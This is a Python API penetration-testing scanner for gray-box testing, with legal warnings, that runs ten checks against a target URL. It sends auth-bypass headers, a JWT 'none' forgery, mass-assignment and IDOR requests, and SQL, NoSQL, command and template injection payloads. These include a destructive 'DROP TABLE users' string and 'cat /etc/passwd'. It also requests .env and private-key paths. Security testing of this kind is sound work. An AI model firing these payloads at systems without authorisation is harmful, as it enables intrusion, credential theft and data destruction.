#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════╗
║         Generic API Penetration Testing Script                ║
║         Gray Box Testing — Beginner Friendly                  ║
║                                                               ║
║  Tests:                                                       ║
║  1. Endpoint Discovery                                        ║
║  2. Authentication Bypass                                     ║
║  3. Broken Access Control                                     ║
║  4. Injection Attacks                                         ║
║  5. Rate Limiting / DoS                                       ║
║  6. Heap Dump & Debug Endpoints                               ║
║  7. JWT Token Testing                                         ║
║  8. Sensitive Data Exposure                                   ║
╚═══════════════════════════════════════════════════════════════╝

HOW TO INSTALL AND RUN:
    pip install requests colorama

    API_PT_TARGET=http://127.0.0.1:8765 API_PT_YES=1 python3 api_pt_scanner.py

    Env: API_PT_TARGET, API_PT_TOKEN, API_PT_USERNAME, API_PT_PASSWORD,
         API_PT_DELAY, API_PT_YES=1 skips the ENTER prompt.

⚠️  ONLY RUN AGAINST SYSTEMS YOU HAVE PERMISSION TO TEST!
"""

import requests          # Making HTTP requests
import json              # Handling JSON data
import time              # Adding delays
import sys               # System operations
import base64            # Decoding base64 tokens
import re                # Regex for pattern matching
import threading         # For rate limit testing
from colorama import Fore, Style, init  # Colored output
from urllib.parse import urljoin        # Building URLs
import urllib3
import os

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# ─────────────────────────────────────────────────────────────
# ⚙️  CONFIGURATION — CHANGE THESE BEFORE RUNNING
# ─────────────────────────────────────────────────────────────

TARGET_URL  = os.environ.get("API_PT_TARGET", "http://your-api-url-here.com")
AUTH_TOKEN  = os.environ.get("API_PT_TOKEN") or None
USERNAME    = os.environ.get("API_PT_USERNAME", "admin")
PASSWORD    = os.environ.get("API_PT_PASSWORD", "password")
DELAY       = float(os.environ.get("API_PT_DELAY", "0.3"))

# ─────────────────────────────────────────────────────────────
# 🎨  COLORS AND DISPLAY
# ─────────────────────────────────────────────────────────────

def banner():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════╗
    ║      API Penetration Testing Script       ║
    ║      Gray Box — Generic Edition           ║
    ╚═══════════════════════════════════════════╝
    """)

def section(title):
    print("\n" + Fore.YELLOW + "═" * 55)
    print(Fore.YELLOW + f"  🔍 {title}")
    print(Fore.YELLOW + "═" * 55)

def finding(severity, message, detail=""):
    icons = {"CRITICAL": "🚨", "HIGH": "⚠️ ", "MEDIUM": "⚡",
             "LOW": "💡", "INFO": "ℹ️ ", "PASS": "✅"}
    colors = {"CRITICAL": Fore.RED, "HIGH": Fore.LIGHTRED_EX,
              "MEDIUM": Fore.YELLOW, "LOW": Fore.LIGHTYELLOW_EX,
              "INFO": Fore.CYAN, "PASS": Fore.GREEN}
    color = colors.get(severity, Fore.WHITE)
    icon  = icons.get(severity, "•")
    print(color + f"\n  {icon} [{severity}] {message}")
    if detail:
        print(Fore.WHITE + f"      → {detail}")
    FINDINGS.append({"severity": severity, "message": message, "detail": detail})

# Global findings list
FINDINGS = []

# ─────────────────────────────────────────────────────────────
# 🌐  REQUEST HELPER
# ─────────────────────────────────────────────────────────────

def req(method, path, headers=None, data=None,
        params=None, use_auth=True, timeout=10):
    """
    Makes HTTP requests to the target API.
    Like a browser but in code — sends requests and reads responses.
    """
    url = urljoin(TARGET_URL, path)

    # Build headers
    h = {"Content-Type": "application/json",
         "Accept": "application/json",
         "User-Agent": "Mozilla/5.0 (Security Scanner)"}

    # Add auth token if available
    if use_auth and AUTH_TOKEN:
        h["Authorization"] = f"Bearer {AUTH_TOKEN}"

    # Merge any extra headers
    if headers:
        h.update(headers)

    try:
        response = requests.request(
            method=method, url=url, headers=h,
            json=data, params=params,
            timeout=timeout, verify=False
        )
        time.sleep(DELAY)
        return response
    except requests.exceptions.ConnectionError:
        return None
    except requests.exceptions.Timeout:
        return None
    except Exception:
        return None


# ─────────────────────────────────────────────────────────────
# TEST 1: CONNECTIVITY
# ─────────────────────────────────────────────────────────────

def test_connectivity():
    """Check if the target is alive and reachable."""
    section("TEST 1: Connectivity Check")
    print(f"  Target: {TARGET_URL}")

    r = req("GET", "/")
    if r is None:
        print(Fore.RED + "  ❌ Target unreachable! Check URL and try again.")
        sys.exit(1)

    finding("INFO", f"Target is alive",
            f"HTTP {r.status_code} — Server: {r.headers.get('Server', 'unknown')}")

    # Check for interesting response headers
    interesting_headers = {
        "X-Powered-By":      "Reveals technology stack",
        "Server":            "Reveals server software",
        "X-AspNet-Version":  "Reveals .NET version",
        "X-Debug-Token":     "Debug mode may be enabled!",
    }
    for header, desc in interesting_headers.items():
        if header.lower() in {k.lower() for k in r.headers}:
            finding("MEDIUM", f"Header reveals info: {header}",
                    f"{desc} — Value: {r.headers.get(header)}")


# ─────────────────────────────────────────────────────────────
# TEST 2: ENDPOINT DISCOVERY
# ─────────────────────────────────────────────────────────────

def test_endpoint_discovery():
    """
    Try to find hidden API endpoints.
    Like trying every door in a building to see which ones open.
    """
    section("TEST 2: Endpoint Discovery")

    endpoints = [
        # ── Health & Status ──────────────────────────────────
        "/health", "/healthz", "/health/live", "/health/ready",
        "/status", "/ping", "/alive", "/ready",

        # ── API Versions ─────────────────────────────────────
        "/api", "/api/v1", "/api/v2", "/api/v3",
        "/v1", "/v2", "/v3",

        # ── Documentation ────────────────────────────────────
        "/swagger", "/swagger.json", "/swagger/index.html",
        "/swagger-ui.html", "/openapi.json", "/openapi",
        "/api-docs", "/docs", "/redoc",
        "/graphql",         # GraphQL endpoint
        "/graphiql",        # GraphQL IDE

        # ── Debug & Admin ─────────────────────────────────────
        "/admin", "/admin/", "/dashboard",
        "/console", "/manager", "/management",
        "/actuator",        # Spring Boot actuator
        "/actuator/health",
        "/actuator/env",    # Environment variables!
        "/actuator/beans",
        "/actuator/mappings",
        "/debug", "/debug/vars", "/debug/pprof",
        "/__debug__",

        # ── Heap Dump & Memory ────────────────────────────────
        "/actuator/heapdump",   # Spring Boot heap dump
        "/actuator/threaddump", # Thread dump
        "/heapdump",
        "/heap",
        "/dump",
        "/threaddump",
        "/jmx",                 # Java Management Extensions

        # ── Metrics & Monitoring ──────────────────────────────
        "/metrics",             # Prometheus metrics
        "/actuator/metrics",
        "/stats", "/statistics",
        "/monitor", "/monitoring",

        # ── Common API Endpoints ──────────────────────────────
        "/users", "/user", "/api/users",
        "/admin/users", "/api/admin",
        "/auth", "/login", "/logout",
        "/register", "/signup",
        "/token", "/refresh", "/oauth",
        "/config", "/settings", "/env",
        "/secrets", "/keys",
        "/logs", "/log",
        "/backup", "/backups",
        "/upload", "/uploads", "/files",

        # ── PHP/Framework Specific ────────────────────────────
        "/phpinfo.php", "/.env", "/.env.local",
        "/config.php", "/wp-admin", "/wp-login.php",

        # ── Kubernetes Specific ───────────────────────────────
        "/api/pods", "/api/deployments",
        "/api/namespaces", "/api/secrets",
        "/api/nodes", "/api/services",
    ]

    print(f"  Checking {len(endpoints)} endpoints...\n")
    found = []

    for path in endpoints:
        r = req("GET", path, use_auth=False)
        if r is None:
            continue

        if r.status_code == 200:
            size = len(r.content)
            finding("HIGH",
                    f"Endpoint accessible without auth: {path}",
                    f"HTTP 200 — Size: {size} bytes")
            found.append(path)

            # Extra check for heap dumps
            if "heapdump" in path or "dump" in path:
                finding("CRITICAL",
                        f"HEAP/THREAD DUMP EXPOSED: {path}",
                        "Memory dump accessible — may contain passwords and secrets!")

            # Check for actuator endpoints
            if "actuator" in path:
                finding("CRITICAL",
                        f"Spring Boot Actuator exposed: {path}",
                        "Actuator endpoints can leak env vars, configs and heap data!")

        elif r.status_code == 403:
            finding("INFO", f"Endpoint exists but forbidden: {path}",
                    "Try auth bypass techniques")
        elif r.status_code == 401:
            finding("INFO", f"Protected endpoint found: {path}",
                    "Requires authentication — test bypass")

    print(f"\n  Found {len(found)} unprotected endpoints")
    return found


# ─────────────────────────────────────────────────────────────
# TEST 3: AUTHENTICATION BYPASS
# ─────────────────────────────────────────────────────────────

def test_auth_bypass():
    """
    Try to access the API without proper authentication.
    Like trying to sneak past a bouncer with various tricks.
    """
    section("TEST 3: Authentication Bypass")

    # Pick a sensitive endpoint to test against
    test_endpoints = [
        "/api/users", "/api/admin", "/admin",
        "/api/secrets", "/actuator/env", "/metrics"
    ]

    bypass_techniques = [
        # (description, headers, params)
        ("No token at all",
         {}, ""),
        ("Empty Bearer token",
         {"Authorization": "Bearer "}, ""),
        ("Token = null",
         {"Authorization": "Bearer null"}, ""),
        ("Token = undefined",
         {"Authorization": "Bearer undefined"}, ""),
        ("Token = admin",
         {"Authorization": "Bearer admin"}, ""),
        ("Token = true",
         {"Authorization": "Bearer true"}, ""),
        ("Admin query param",
         {}, "?admin=true"),
        ("Debug query param",
         {}, "?debug=true"),
        ("Role override header",
         {"X-Role": "admin"}, ""),
        ("User ID override",
         {"X-User-ID": "1", "X-User-Role": "admin"}, ""),
        ("Internal request spoof",
         {"X-Internal": "true"}, ""),
        ("Localhost spoof",
         {"X-Forwarded-For": "127.0.0.1",
          "X-Real-IP": "127.0.0.1",
          "X-Original-IP": "127.0.0.1"}, ""),
        ("Content type confusion",
         {"Content-Type": "text/plain"}, ""),
        ("Method override",
         {"X-HTTP-Method-Override": "GET"}, ""),
        ("Old API version",
         {}, ""),
    ]

    for endpoint in test_endpoints[:3]:  # Test first 3 endpoints
        print(f"\n  Testing bypass on: {endpoint}")
        for desc, headers, params in bypass_techniques:
            r = req("GET", endpoint + params,
                    headers=headers, use_auth=False)
            if r is None:
                continue

            if r.status_code == 200:
                finding("CRITICAL",
                        f"AUTH BYPASS: {desc} on {endpoint}",
                        f"Got HTTP 200 — unauthorized access!")
            elif r.status_code not in [401, 403]:
                finding("MEDIUM",
                        f"Unexpected response for '{desc}' on {endpoint}",
                        f"HTTP {r.status_code} — investigate manually")


# ─────────────────────────────────────────────────────────────
# TEST 4: BROKEN ACCESS CONTROL
# ─────────────────────────────────────────────────────────────

def test_broken_access_control():
    """
    Test if you can access other users' data.
    Like using your hotel key and it opens other rooms too.
    """
    section("TEST 4: Broken Access Control (IDOR)")

    print("  Testing Insecure Direct Object Reference (IDOR)...\n")

    # Test accessing different user IDs
    # In gray box we know some IDs exist — try nearby ones
    id_endpoints = [
        "/api/users/{id}",
        "/api/users/{id}/profile",
        "/api/users/{id}/data",
        "/api/profile/{id}",
        "/api/orders/{id}",
        "/api/accounts/{id}",
        "/api/documents/{id}",
    ]

    test_ids = [1, 2, 3, 0, -1, 99999,
                "admin", "root", "system",
                "00000000-0000-0000-0000-000000000001"]  # UUID v4

    for endpoint_template in id_endpoints[:3]:
        for id_val in test_ids[:5]:
            path = endpoint_template.replace("{id}", str(id_val))
            r = req("GET", path, use_auth=True)
            if r and r.status_code == 200:
                finding("HIGH",
                        f"IDOR — Accessed resource: {path}",
                        f"HTTP 200 — Check if this data belongs to another user!")

    # Test HTTP method switching
    print("\n  Testing HTTP Method Switching...")
    methods_to_test = ["GET", "POST", "PUT", "DELETE",
                       "PATCH", "HEAD", "OPTIONS", "TRACE"]

    for method in methods_to_test:
        r = req(method, "/api/users/1", use_auth=True)
        if r and r.status_code == 200:
            finding("MEDIUM",
                    f"HTTP method {method} allowed on /api/users/1",
                    "Check if this should be allowed")

    # Mass assignment test
    print("\n  Testing Mass Assignment...")
    payloads = [
        {"role": "admin", "is_admin": True},
        {"role": "superuser", "permissions": ["all"]},
        {"user_type": "admin", "verified": True},
        {"balance": 999999, "credits": 999999},
    ]
    for payload in payloads:
        r = req("PUT", "/api/users/me",
                data=payload, use_auth=True)
        if r and r.status_code == 200:
            try:
                resp_data = r.json()
                for key in payload:
                    if key in str(resp_data):
                        finding("HIGH",
                                "Mass Assignment vulnerability!",
                                f"Server accepted field: {key}")
            except:
                pass


# ─────────────────────────────────────────────────────────────
# TEST 5: INJECTION ATTACKS
# ─────────────────────────────────────────────────────────────

def test_injection():
    """
    Test if the API is vulnerable to injection attacks.
    Like slipping a fake order into a restaurant's system.
    """
    section("TEST 5: Injection Attacks")

    # SQL Injection payloads
    sqli_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "1; DROP TABLE users--",
        "1 UNION SELECT null,null,null--",
        "' UNION SELECT username,password FROM users--",
        "admin'--",
        "1' AND SLEEP(5)--",    # Time-based blind SQLi
        "1; WAITFOR DELAY '0:0:5'--",  # MSSQL time-based
    ]

    # NoSQL Injection payloads
    nosql_payloads = [
        {"$gt": ""},
        {"$where": "1==1"},
        {"$regex": ".*"},
        {"username": {"$ne": None}},
    ]

    # Command injection payloads
    cmd_payloads = [
        "; ls -la",
        "| whoami",
        "`whoami`",
        "$(whoami)",
        "; cat /etc/passwd",
        "& dir",
    ]

    # SSTI (Server Side Template Injection)
    ssti_payloads = [
        "{{7*7}}",           # Should return 49 if vulnerable
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config}}",        # Flask/Jinja2 config dump
        "{{request.environ}}",
    ]

    # Test endpoints for injection
    inject_endpoints = [
        "/api/users/search",
        "/api/search",
        "/api/login",
        "/api/products",
        "/api/filter",
    ]

    print("  Testing SQL Injection...")
    for endpoint in inject_endpoints[:2]:
        for payload in sqli_payloads[:4]:
            # Test in query params
            r = req("GET", endpoint,
                    params={"q": payload, "search": payload,
                            "id": payload, "username": payload},
                    use_auth=True)
            if r is None:
                continue

            content = r.text.lower()
            # Signs of SQL error
            sql_errors = ["sql", "mysql", "sqlite", "postgresql",
                          "ora-", "syntax error", "unclosed quotation",
                          "invalid query", "you have an error in your sql"]
            for err in sql_errors:
                if err in content:
                    finding("CRITICAL",
                            f"SQL Injection vulnerability at {endpoint}!",
                            f"Error: {err} — Payload: {payload}")
                    break

            # Check for time-based SQLi (5+ second response)
            if r.elapsed.total_seconds() > 4:
                finding("HIGH",
                        f"Possible time-based SQL injection at {endpoint}",
                        f"Response took {r.elapsed.total_seconds():.1f}s")

    print("  Testing NoSQL Injection...")
    for endpoint in inject_endpoints[:2]:
        for payload in nosql_payloads:
            r = req("POST", endpoint, data=payload, use_auth=True)
            if r and r.status_code == 200:
                try:
                    data = r.json()
                    if isinstance(data, list) and len(data) > 0:
                        finding("HIGH",
                                f"Possible NoSQL injection at {endpoint}",
                                f"Returned {len(data)} records with operator payload")
                except:
                    pass

    print("  Testing SSTI (Template Injection)...")
    for endpoint in inject_endpoints[:2]:
        for payload in ssti_payloads:
            r = req("GET", endpoint,
                    params={"name": payload, "template": payload},
                    use_auth=True)
            if r and "49" in r.text:
                finding("CRITICAL",
                        f"Server Side Template Injection at {endpoint}!",
                        f"Payload {{{{7*7}}}} returned 49 — RCE possible!")

    print("  Testing Command Injection...")
    for endpoint in inject_endpoints[:2]:
        for payload in cmd_payloads[:3]:
            r = req("GET", endpoint,
                    params={"cmd": payload, "exec": payload},
                    use_auth=True)
            if r is None:
                continue
            # Look for command output in response
            cmd_signs = ["root:", "/bin/bash", "uid=", "www-data",
                         "volume in drive", "directory of"]
            for sign in cmd_signs:
                if sign in r.text.lower():
                    finding("CRITICAL",
                            f"Command Injection at {endpoint}!",
                            f"Found '{sign}' in response — RCE confirmed!")


# ─────────────────────────────────────────────────────────────
# TEST 6: HEAP DUMP & DEBUG ENDPOINTS
# ─────────────────────────────────────────────────────────────

def test_heap_and_debug():
    """
    Look for memory dumps and debug endpoints.
    Like finding a server's diary — contains everything!
    """
    section("TEST 6: Heap Dump & Debug Endpoints")

    heap_endpoints = [
        # Spring Boot / Java
        "/actuator/heapdump",
        "/actuator/threaddump",
        "/actuator/env",
        "/actuator/configprops",
        "/actuator/beans",
        "/actuator/loggers",
        "/actuator/info",
        "/actuator/scheduledtasks",
        "/actuator/httptrace",
        "/actuator/auditevents",

        # Generic dump endpoints
        "/heapdump", "/heap-dump",
        "/threaddump", "/thread-dump",
        "/dump", "/memory-dump",

        # PHP
        "/phpinfo.php",
        "/info.php",
        "/?phpinfo=1",

        # Django / Python
        "/django-admin",
        "/__debug__/",
        "/debug-toolbar",

        # Node.js
        "/node_modules",
        "/.env",
        "/package.json",

        # Generic debug
        "/trace", "/tracing",
        "/profile", "/profiling",
        "/pprof",               # Go profiling
        "/debug/pprof",
        "/debug/pprof/heap",    # Go heap dump
        "/debug/pprof/goroutine",
        "/debug/vars",          # Go expvar

        # Kubernetes
        "/api/v1/namespaces/default/secrets",
        "/readyz", "/livez",
    ]

    print(f"  Checking {len(heap_endpoints)} debug/dump endpoints...\n")

    for path in heap_endpoints:
        r = req("GET", path, use_auth=False)
        if r is None:
            continue

        if r.status_code == 200:
            size = len(r.content)

            # Large binary response = likely a real heap dump!
            if size > 100000:  # > 100KB
                finding("CRITICAL",
                        f"HEAP DUMP EXPOSED: {path}",
                        f"Size: {size/1024:.1f}KB — "
                        f"Contains memory, passwords, tokens!")
            else:
                content = r.text.lower()

                # Check for sensitive data in response
                sensitive = ["password", "secret", "token", "key",
                             "aws_secret", "database_url", "private",
                             "jdbc:", "mongodb://", "redis://"]
                found_sensitive = [s for s in sensitive if s in content]

                if found_sensitive:
                    finding("CRITICAL",
                            f"SENSITIVE DATA in debug endpoint: {path}",
                            f"Contains: {', '.join(found_sensitive)}")
                else:
                    finding("HIGH",
                            f"Debug endpoint exposed: {path}",
                            f"HTTP 200 — Size: {size} bytes")

        elif r.status_code == 403:
            finding("INFO",
                    f"Debug endpoint exists but protected: {path}",
                    "Try auth bypass on this endpoint")


# ─────────────────────────────────────────────────────────────
# TEST 7: RATE LIMITING
# ─────────────────────────────────────────────────────────────

def test_rate_limiting():
    """
    Test if the API has rate limiting.
    Like checking if a bouncer stops you after too many attempts.
    """
    section("TEST 7: Rate Limiting & DoS")

    print("  Sending 20 rapid requests to test rate limiting...")
    print("  (This is gentle — only 20 requests)\n")

    endpoint = "/api/login"
    responses = []

    # Send 20 requests quickly
    for i in range(20):
        r = req("POST", endpoint,
                data={"username": "test", "password": "test"},
                use_auth=False)
        if r:
            responses.append(r.status_code)
            print(Fore.CYAN + f"  Request {i+1:02d}: HTTP {r.status_code}", end="\r")
        time.sleep(0.1)  # 100ms between requests

    print("")

    # Analyze responses
    status_codes = set(responses)

    if 429 in status_codes:
        finding("PASS",
                "Rate limiting is working! (Got HTTP 429 Too Many Requests)",
                "Server blocks excessive requests ✅")
    elif 403 in status_codes:
        finding("PASS",
                "Some form of blocking detected (HTTP 403)",
                "May have rate limiting or IP blocking")
    else:
        finding("HIGH",
                "No rate limiting detected!",
                f"Sent 20 requests, all returned: {status_codes} "
                f"— Brute force attacks possible!")

    # Test login endpoint specifically for account lockout
    print("\n  Testing account lockout policy...")
    lockout_detected = False
    for i in range(10):
        r = req("POST", "/api/login",
                data={"username": USERNAME, "password": "wrongpassword"},
                use_auth=False)
        if r and r.status_code == 429:
            finding("PASS",
                    f"Account lockout triggered after {i+1} attempts",
                    "Good security practice!")
            lockout_detected = True
            break
        elif r and "locked" in r.text.lower():
            finding("PASS",
                    f"Account locked after {i+1} attempts",
                    "Lockout policy is working")
            lockout_detected = True
            break

    if not lockout_detected:
        finding("HIGH",
                "No account lockout detected after 10 failed logins!",
                "Brute force attacks are possible on login endpoint")


# ─────────────────────────────────────────────────────────────
# TEST 8: JWT TOKEN TESTING
# ─────────────────────────────────────────────────────────────

def test_jwt():
    """
    Test JWT token security.
    JWT = the ID badge your app uses — we test if it can be faked.
    """
    section("TEST 8: JWT Token Testing")

    if not AUTH_TOKEN:
        print(Fore.YELLOW + "  ⚡ No token provided — skipping JWT tests")
        print(Fore.YELLOW + "  Set AUTH_TOKEN at the top of the script to run these tests")
        return

    print(f"  Analyzing token: {AUTH_TOKEN[:50]}...")

    # Try to decode without verification (just base64)
    try:
        parts = AUTH_TOKEN.split(".")
        if len(parts) == 3:
            # Decode header
            header_b64  = parts[0] + "=="
            payload_b64 = parts[1] + "=="

            header  = json.loads(base64.b64decode(header_b64))
            payload = json.loads(base64.b64decode(payload_b64))

            print(Fore.CYAN + f"\n  Token Header:  {json.dumps(header, indent=2)}")
            print(Fore.CYAN + f"  Token Payload: {json.dumps(payload, indent=2)}")

            # Check algorithm
            alg = header.get("alg", "").upper()
            if alg == "NONE":
                finding("CRITICAL",
                        "JWT uses 'none' algorithm — ZERO security!",
                        "Anyone can forge tokens!")
            elif alg == "HS256":
                finding("MEDIUM",
                        "JWT uses HS256 — weak if secret is simple",
                        "Try brute forcing the secret key")
            elif alg in ["RS256", "ES256"]:
                finding("PASS",
                        f"JWT uses strong algorithm: {alg}",
                        "Good — asymmetric signing")

            # Check expiry
            import time as t
            exp = payload.get("exp")
            if exp:
                if exp < t.time():
                    finding("INFO",
                            "JWT token is expired",
                            "Test if server still accepts it!")
                else:
                    remaining = exp - t.time()
                    if remaining > 86400:  # More than 24 hours
                        finding("MEDIUM",
                                f"JWT token has very long expiry: "
                                f"{remaining/3600:.0f} hours",
                                "Long-lived tokens are a security risk")
            else:
                finding("HIGH",
                        "JWT has no expiry (no 'exp' claim)!",
                        "Token never expires — security risk!")

            # Check for sensitive data in payload
            sensitive_fields = ["password", "secret", "key", "ssn",
                                 "credit_card", "pin"]
            for field in sensitive_fields:
                if field in str(payload).lower():
                    finding("HIGH",
                            f"Sensitive data in JWT payload: {field}",
                            "JWT payload is base64 — NOT encrypted!")

    except Exception as e:
        finding("INFO", "Could not decode token",
                f"Token may not be JWT format: {e}")

    # Test algorithm confusion
    print("\n  Testing JWT algorithm confusion...")
    none_token = AUTH_TOKEN.split(".")[0] + "." + \
                 AUTH_TOKEN.split(".")[1] + "."

    r = req("GET", "/api/users/me",
            headers={"Authorization": f"Bearer {none_token}"},
            use_auth=False)
    if r and r.status_code == 200:
        finding("CRITICAL",
                "JWT 'none' algorithm attack successful!",
                "Server accepts unsigned tokens!")


# ─────────────────────────────────────────────────────────────
# TEST 9: SENSITIVE DATA EXPOSURE
# ─────────────────────────────────────────────────────────────

def test_sensitive_data():
    """
    Look for accidentally exposed sensitive information.
    Like finding confidential documents left on a photocopier.
    """
    section("TEST 9: Sensitive Data Exposure")

    # Files that should never be public
    sensitive_files = [
        "/.env", "/.env.local", "/.env.production",
        "/.env.backup", "/env.txt",
        "/config.json", "/config.yml", "/config.yaml",
        "/settings.json", "/settings.py",
        "/secrets.json", "/secrets.yml",
        "/database.yml", "/database.json",
        "/wp-config.php", "/configuration.php",
        "/.git/config",         # Git repo config
        "/.git/HEAD",           # Git HEAD
        "/.svn/entries",        # SVN
        "/backup.sql",          # Database backup!
        "/dump.sql",
        "/db.sqlite",
        "/app.log", "/error.log", "/access.log",
        "/server.log", "/debug.log",
        "/id_rsa",              # Private SSH key!
        "/id_rsa.pub",
        "/.ssh/id_rsa",
        "/private.key",
        "/server.key",
        "/certificate.pem",
    ]

    print(f"  Checking {len(sensitive_files)} sensitive file paths...\n")

    for path in sensitive_files:
        r = req("GET", path, use_auth=False)
        if r is None:
            continue

        if r.status_code == 200:
            content = r.text

            # Check what's actually in the file
            if "BEGIN" in content and "KEY" in content:
                finding("CRITICAL",
                        f"PRIVATE KEY EXPOSED: {path}",
                        "Cryptographic key accessible publicly!")
            elif any(x in content for x in
                     ["DB_PASSWORD", "DATABASE_URL", "SECRET_KEY",
                      "AWS_SECRET", "PRIVATE_KEY"]):
                finding("CRITICAL",
                        f"CREDENTIALS EXPOSED: {path}",
                        f"File contains sensitive environment variables!")
            elif ".git" in path:
                finding("HIGH",
                        f"Git repository exposed: {path}",
                        "Source code and history may be downloadable!")
            elif ".sql" in path or "dump" in path:
                finding("CRITICAL",
                        f"DATABASE FILE EXPOSED: {path}",
                        "Database dump publicly accessible!")
            else:
                finding("HIGH",
                        f"Sensitive file exposed: {path}",
                        f"HTTP 200 — Size: {len(content)} bytes")


# ─────────────────────────────────────────────────────────────
# TEST 10: SECURITY HEADERS CHECK
# ─────────────────────────────────────────────────────────────

def test_security_headers():
    """
    Check if the API has proper security headers.
    Like checking if a building has proper fire safety signs.
    """
    section("TEST 10: Security Headers")

    r = req("GET", "/", use_auth=False)
    if r is None:
        return

    required_headers = {
        "Strict-Transport-Security":
            "Enforces HTTPS — missing = MITM attacks possible",
        "X-Content-Type-Options":
            "Prevents MIME sniffing attacks",
        "X-Frame-Options":
            "Prevents clickjacking attacks",
        "Content-Security-Policy":
            "Prevents XSS attacks",
        "X-XSS-Protection":
            "Browser XSS filter",
        "Referrer-Policy":
            "Controls referrer information leakage",
    }

    headers_lower = {k.lower(): v for k, v in r.headers.items()}

    for header, description in required_headers.items():
        if header.lower() in headers_lower:
            finding("PASS", f"Security header present: {header}")
        else:
            finding("MEDIUM",
                    f"Missing security header: {header}",
                    description)

    # Check for dangerous headers
    dangerous = {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Credentials": "true",
    }
    for header, bad_value in dangerous.items():
        value = headers_lower.get(header.lower(), "")
        if bad_value in value:
            finding("HIGH",
                    f"Dangerous CORS header: {header}: {bad_value}",
                    "Any website can make API calls on behalf of users!")


# ─────────────────────────────────────────────────────────────
# FINAL REPORT
# ─────────────────────────────────────────────────────────────

def print_report():
    """Print a clean summary of all findings."""
    print("\n\n" + "═" * 55)
    print(Fore.CYAN + "  📋 FINAL REPORT")
    print("═" * 55)

    if not FINDINGS:
        print(Fore.GREEN + "\n  🎉 No findings! Target appears secure.")
        return

    # Count by severity
    counts = {}
    for f in FINDINGS:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1

    print(f"""
  Summary:
  ┌─────────────┬───────┐
  │ CRITICAL    │  {str(counts.get('CRITICAL', 0)).rjust(4)} │
  │ HIGH        │  {str(counts.get('HIGH', 0)).rjust(4)} │
  │ MEDIUM      │  {str(counts.get('MEDIUM', 0)).rjust(4)} │
  │ LOW         │  {str(counts.get('LOW', 0)).rjust(4)} │
  │ INFO        │  {str(counts.get('INFO', 0)).rjust(4)} │
  │ PASS        │  {str(counts.get('PASS', 0)).rjust(4)} │
  └─────────────┴───────┘
    """)

    # Print criticals first
    for severity in ["CRITICAL", "HIGH", "MEDIUM"]:
        sev_findings = [f for f in FINDINGS if f["severity"] == severity]
        if sev_findings:
            color = Fore.RED if severity == "CRITICAL" else \
                    Fore.LIGHTRED_EX if severity == "HIGH" else Fore.YELLOW
            print(color + f"\n  {severity} FINDINGS:")
            for f in sev_findings:
                print(color + f"     • {f['message']}")
                if f["detail"]:
                    print(Fore.WHITE + f"       → {f['detail']}")

    # Save to JSON
    with open("api_pt_findings.json", "w") as file:
        json.dump(FINDINGS, file, indent=2)

    print(Fore.GREEN + "\n  📁 Full findings saved to: api_pt_findings.json")
    print(Fore.CYAN + "\n  💡 For your report — focus on CRITICAL and HIGH first!")
    print(Fore.CYAN + "  💡 For each finding: WHAT it is, WHY it's bad, HOW to fix it")
    print("\n" + "═" * 55 + "\n")


# ─────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────

def main():
    banner()

    print(Fore.YELLOW + """
  ⚠️  LEGAL REMINDER:
  Only run this against systems you have explicit
  written permission to test. Unauthorized testing
  is illegal in most countries!
    """)

    print(Fore.CYAN + f"  🎯 Target: {TARGET_URL}")
    print(Fore.CYAN + f"  🔑 Auth:   {'Token provided' if AUTH_TOKEN else 'No token — testing unauthenticated'}")
    if not os.environ.get("API_PT_YES"):
        input("\n  Press ENTER to start...\n")

    # Run all tests in order
    test_connectivity()          # Test 1
    test_endpoint_discovery()    # Test 2
    test_auth_bypass()           # Test 3
    test_broken_access_control() # Test 4
    test_injection()             # Test 5
    test_heap_and_debug()        # Test 6
    test_rate_limiting()         # Test 7
    test_jwt()                   # Test 8
    test_sensitive_data()        # Test 9
    test_security_headers()      # Test 10

    print_report()


if __name__ == "__main__":
    main()
